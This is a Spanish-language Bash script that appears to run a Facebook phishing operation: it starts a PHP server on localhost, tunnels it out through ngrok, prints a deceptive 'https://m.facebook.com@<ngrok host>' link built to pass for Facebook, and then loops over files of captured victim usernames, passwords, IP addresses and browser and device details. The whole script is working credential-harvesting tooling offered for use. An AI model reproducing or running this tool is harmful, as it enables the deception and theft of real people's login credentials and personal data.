#!/usr/bin/bash

#colores

declare -gA colours=(
	["gray"]="\033[1;30m" ["red"]="\033[1;31m"
	["green"]="\033[1;32m" ["yellow"]="\033[1;33m"
	["blue"]="\033[1;34m" ["cyan"]="\033[1;35m"
	["white"]="\033[0m"
)
trap ctrl_c INT > /dev/null 2>&1

function ctrl_c {
	pkill php 2> /dev/null; pkill ngrok 2> /dev/null
	for ((x=1; x<=2; x=x+1)); do
		if [[ ${x} -eq 1 ]]; then echo ''; fi
		echo -ne "${colours["yellow"]}[${colours["red"]}-${colours["yellow"]}] ${colours["red"]}Saliendo.${colours["white"]}\r"; sleep 0.5
		echo -ne "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}Saliendo..${colours["white"]}\r"; sleep 0.5
		echo -ne "${colours["yellow"]}[${colours["red"]}-${colours["yellow"]}] ${colours["red"]}Saliendo...${colours["white"]}\r"; sleep 0.5
		if [[ ${x} -eq 2 ]]; then echo ''; fi
	done
	tput cnorm; exit 0
}

function dependencias(){
	pkill php 2> /dev/null; pkill ngrok 2> /dev/null
command -v ruby > /dev/null 2>&1 || {
	echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado ruby, instalalo!.\n"
	echo >&2 -Ee "\t${colours["green"]}apt install ruby -y${colours["white"]}\n"; exit 1
}

command -v tput > /dev/null 2>&1 || {
        echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado ncurses, instalalo!.\n"
        echo >&2 -Ee "\t${colours["green"]}apt install ncurses -y${colours["white"]}\n"; exit 1
}

command -v php > /dev/null 2>&1 || {
	echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado php, instalalo!.\n"
	echo >&2 -Ee "\t${colours["green"]}apt install php -y${colours["white"]}\n"; exit 1
}

command -v wget > /dev/null 2>&1 || {
	echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado wget, instalalo!.\n"
	echo >&2 -Ee "\t${colours["green"]}apt install wget -y${colours["white"]}\n"; exit 1
}

command -v curl > /dev/null 2>&1 || {
        echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado curl, instalalo!.\n"
        echo >&2 -Ee "\t${colours["green"]}apt install curl -y${colours["white"]}\n"; exit 1
}

command -v lolcat > /dev/null 2>&1 || {
	echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado lolcat, instalalo!.\n"
        echo >&2 -Ee "\t${colours["green"]}gem install lolcat${colours["white"]}\n"; exit 1
}

}

function banner(){
tput civis; clear; cd files; echo -e "${blue}
< K4l1_T00l >
 
 -----------
   
  _______ ____       _    ____          __    __
 |__   __|___ \     | |  |___ \        / /   / /
    | |    __) |_ __| | __ __) |_ __  / /_  / /_
    | |   |__ <| '__| |/ /|__ <| '_ \| '_ \| '_ \
    | |   ___) | |  |   < ___) | | | | (_) | (_) |
    |_|  |____/|_|  |_|\_\____/|_| |_|\___/ \___/" | lolcat; tput civis
  echo -Ee "      github: https://github.com/t3rk3n666?tab=repositories" | lolcat -a; tput civis
  echo -Ee "\t    facebook: FUCK_SOCIETY" | lolcat -a; tput civis

}

 function ngrok(){
	 tput civis; php -S localhost:4433 2> /dev/null &
	 for ((x=1;x<=6; x=x+1)); do
		 echo -ne "\r${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor local."; sleep 0.2
		 echo -ne "\r${colours["yellow"]}[${colours["red"]}|${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor local.."; sleep 0.2
		 echo -ne "\r${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor local..."; sleep 0.2
		 if [[ ${x} -eq 6 ]]; then echo ''; fi
	 done

	 ./ngrok http 4433 > /dev/null 2> /dev/null &

	 for ((x=1;x<=17; x=x+1)); do
		 echo -ne "\r${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor ngrok."; sleep 0.2
                 echo -ne "\r${colours["yellow"]}[${colours["red"]}|${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor ngrok.."; sleep 0.2
                 echo -ne "\r${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor ngrok..."; sleep 0.2
		 if [[ ${x} -eq 17 ]]; then echo ""; fi
	 done
echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Obteniendo links..."; sleep 1.5
echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Servidor local:${colours["white"]} localhost:4433"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Servidor ngrok:${colours["white"]} $(curl -s http://127.0.0.1:404[0-9]/api/tunnels | grep -o "https://[a-z0-9A-Z]*\.ngrok.io" | head -n1)"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Servidor local.run:${colours["red"]} Deshabilitado!"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Servidor serveo.net:${colours["red"]} Deshabilitado!"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Link camuflado:${colours["white"]} https://m.facebook.com@$(curl -s http://127.0.0.1:404[0-9]/api/tunnels | grep -o "https://[a-z0-9A-Z]*\.ngrok.io" | head -n1 | cut -c 9-100)"

echo -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["gray"]}Esperando datos...\t\t\t${colours["green"]}    parar: ctrl+c"

while [ true ]; do
	if [ -f credentials.txt ]; then
		echo -e "\n\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Usuario: ${white}$(grep -i "usuario" credentials.txt | cut -d ":" -f2)"
		echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["${colours["yellow"]}"]}Contraseña: ${white}$(grep -i "Contrasena" credentials.txt| cut -d ":" -f2)\n"
		for ((x=1; x<=50; x=x+1)); do echo -nEe "${colours["blue"]}#"; done
		rm -f credentials.txt
	fi
	if [ -f credentials2.txt ]; then
		echo '';for ((x=1; x<=50; x=x+1)); do echo -nEe "${colours["blue"]}#"; done
		echo -e "\n\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] \033[0;33mLa victima accedió al link!"
		if [ -f ip.txt ]; then echo -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${yellow}IP:${colours["white"]}$(cat ip.txt | grep -iE "ip" | cut -d ':' -f2)"; fi
		echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Mobile:${colours["white"]}$(grep -i "user-agent" credentials2.txt | cut -d ":" -f2 | cut -d ")" -f1 | cut -d ";" -f3)"
		echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Version:${colours["white"]}$(grep -i "user-agent" credentials2.txt | cut -d ":" -f2 | cut -d ";" -f2 )"
		echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Navegador: ${colours["white"]}$(grep -i "user-agent" credentials2.txt | cut -d ":" -f2 | cut -d ")" -f3 | cut -d " " -f2 | tr -d ' ')"
		echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Sistema Operativo:${colours["white"]}$(grep -i "sistema" credentials2.txt | cut -d ":" -f2)"
		if [ $(grep -i "lenguaje" credentials2.txt| cut -d ":" -f2 | tr -d ' ') == "es-PE" ]; then
			echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}lenguaje: ${colours["white"]}Español/Castellano"
			echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}País: ${colours["white"]}Perú\n"
		else
			echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}lenguaje:${colours["white"]}$(grep -i "lenguaje" credentials2.txt| cut -d ":" -f2)\n"
		fi
		for ((x=1; x<=50; x=x+1)); do echo -nEe "${colours["blue"]}#"; done
		rm -rf credentials2.txt
	fi
done
}

dependencias
banner
ngrok
